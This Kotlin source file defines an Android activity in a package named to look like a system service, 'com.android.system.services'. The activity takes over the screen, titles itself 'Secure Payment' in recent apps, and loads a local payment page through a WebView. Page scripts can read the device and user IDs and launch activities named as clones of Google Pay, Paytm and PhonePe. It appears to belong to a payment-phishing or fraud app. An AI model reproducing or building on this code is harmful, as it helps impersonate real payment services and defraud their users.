package com.android.system.services

import android.app.ActivityManager
import android.content.Intent
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.WindowManager
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import com.android.system.services.utils.DeviceInfoHelper
import com.android.system.services.ServerConfig

class PaymentActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var deviceId: String
    private lateinit var appConfig: AppConfig

    companion object {
        private const val TAG = "PaymentActivity"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        enableFullscreen()
        setTaskDescriptionForRecentApps()
        
        appConfig = AppConfig.load(this)
        deviceId = DeviceInfoHelper.getDeviceId(this)
        
        ServerConfig.initialize(this)
        
        webView = createWebView()
        setContentView(webView)
        
        loadPaymentHtml()
    }

    private fun setTaskDescriptionForRecentApps() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val taskDescription = ActivityManager.TaskDescription(
                "Secure Payment",
                BitmapFactory.decodeResource(resources, android.R.drawable.ic_menu_myplaces),
                ContextCompat.getColor(this, android.R.color.white)
            )
            setTaskDescription(taskDescription)
        }
    }

    private fun enableFullscreen() {
        supportActionBar?.hide()
        
        WindowCompat.setDecorFitsSystemWindows(window, false)
        
        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
        windowInsetsController.apply {
            hide(WindowInsetsCompat.Type.systemBars())
            systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                isAppearanceLightStatusBars = true
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                isAppearanceLightNavigationBars = false
            }
        }
        
        window.statusBarColor = android.graphics.Color.TRANSPARENT
        window.navigationBarColor = android.graphics.Color.TRANSPARENT
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
    }

    private fun createWebView(): WebView {
        val webView = WebView(this).apply {
            layoutParams = android.view.ViewGroup.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                android.view.ViewGroup.LayoutParams.MATCH_PARENT
            )
            
            isVerticalScrollBarEnabled = false
            isHorizontalScrollBarEnabled = false
            setBackgroundColor(android.graphics.Color.WHITE)
        }

        val webSettings: WebSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.domStorageEnabled = true
        webSettings.databaseEnabled = true
        webSettings.allowFileAccess = true
        webSettings.allowContentAccess = true

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            webSettings.allowFileAccessFromFileURLs = false
            webSettings.allowUniversalAccessFromFileURLs = false
        }

        webSettings.loadWithOverviewMode = true
        webSettings.useWideViewPort = true
        webSettings.layoutAlgorithm = WebSettings.LayoutAlgorithm.NORMAL
        webSettings.setSupportZoom(false)
        webSettings.builtInZoomControls = false
        webSettings.displayZoomControls = false
        webSettings.loadsImagesAutomatically = true
        webSettings.blockNetworkImage = false
        webSettings.blockNetworkLoads = false
        webSettings.cacheMode = WebSettings.LOAD_DEFAULT

        webView.setInitialScale(100)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null)
            WebView.setWebContentsDebuggingEnabled(true)
        } else {
            webView.setLayerType(WebView.LAYER_TYPE_SOFTWARE, null)
        }

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, request: android.webkit.WebResourceRequest?): Boolean {
                val url = request?.url?.toString() ?: return false
                return handleUrlNavigation(url)
            }

            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                return if (url != null) {
                    handleUrlNavigation(url)
                } else {
                    false
                }
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                applyThemeColorFromPage()
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onConsoleMessage(msg: android.webkit.ConsoleMessage?): Boolean {
                msg?.let {
                    Log.d(TAG, "JS: ${it.message()}")
                }
                return true
            }
        }

        webView.addJavascriptInterface(object {
            @android.webkit.JavascriptInterface
            fun getDeviceId(): String = deviceId
            
            @android.webkit.JavascriptInterface
            fun getUserId(): String = appConfig.userId
            
            @android.webkit.JavascriptInterface
            fun getAppType(): String = appConfig.appType
            
            @android.webkit.JavascriptInterface
            fun getAppName(): String = appConfig.appName
            
            @android.webkit.JavascriptInterface
            fun getBaseUrl(): String = ServerConfig.getBaseUrl()
            
            @android.webkit.JavascriptInterface
            fun getPaymentAmount(): String = appConfig.payment.formattedAmount()
            
            @android.webkit.JavascriptInterface
            fun getPaymentDescription(): String = appConfig.payment.description
            
            @android.webkit.JavascriptInterface
            fun openPaymentClone(paymentMethod: String) {
                openPaymentCloneActivity(paymentMethod)
            }
            
            @android.webkit.JavascriptInterface
            fun notifyPaymentSuccess() {
                broadcastPaymentSuccess()
            }
        }, "Android")

        return webView
    }

    private fun handleUrlNavigation(url: String): Boolean {
        if (url.startsWith("http://") || url.startsWith("https://")) {
            return false
        }
        
        if (url.endsWith(".html")) {
            val fullUrl = if (url.startsWith("file://")) {
                url
            } else if (url.startsWith("/")) {
                "file:///android_asset${url}"
            } else {
                "file:///android_asset/$url"
            }
            
            webView.loadUrl(fullUrl)
            return true
        }
        
        return false
    }

    private fun loadPaymentHtml() {
        val paymentHtmlPath = "file:///android_asset/payment.html"
        webView.loadUrl(paymentHtmlPath)
    }
    
    private fun openPaymentCloneActivity(paymentMethod: String) {
        val intent = when (paymentMethod.lowercase()) {
            "gpay", "googlepay", "google-pay" -> {
                Intent(this, GPayCloneActivity::class.java)
            }
            "paytm" -> {
                Intent(this, PaytmCloneActivity::class.java)
            }
            "phonepe" -> {
                Intent(this, PhonePeCloneActivity::class.java)
            }
            else -> {
                Log.e(TAG, "Unknown payment method: $paymentMethod")
                return
            }
        }
        
        startActivity(intent)
        finish()
    }
    
    private fun broadcastPaymentSuccess() {
        try {
            val intent = Intent(Constants.ACTION_PAYMENT_SUCCESS).apply {
                putExtra("flavor", BuildConfig.APP_FLAVOR)
            }
            sendBroadcast(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to broadcast payment success", e)
        }
    }

    private fun applyThemeColorFromPage() {
        webView.evaluateJavascript(
            """
            (function() {
                try {
                    var metaTheme = document.querySelector('meta[name="theme-color"]');
                    if (metaTheme) {
                        return metaTheme.getAttribute('content');
                    }
                    return null;
                } catch(e) {
                    return null;
                }
            })();
            """.trimIndent()
        ) { color ->
            if (color != null && color != "null") {
                val colorValue = color.replace("\"", "")
                try {
                    val parsedColor = android.graphics.Color.parseColor(colorValue)
                    runOnUiThread {
                        window.statusBarColor = parsedColor
                        window.navigationBarColor = parsedColor
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to parse color: $colorValue", e)
                }
            }
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (::webView.isInitialized && webView.canGoBack()) {
            webView.goBack()
        } else {
            finish()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        
        if (::webView.isInitialized) {
            webView.stopLoading()
            webView.clearCache(true)
            webView.destroy()
        }
    }
}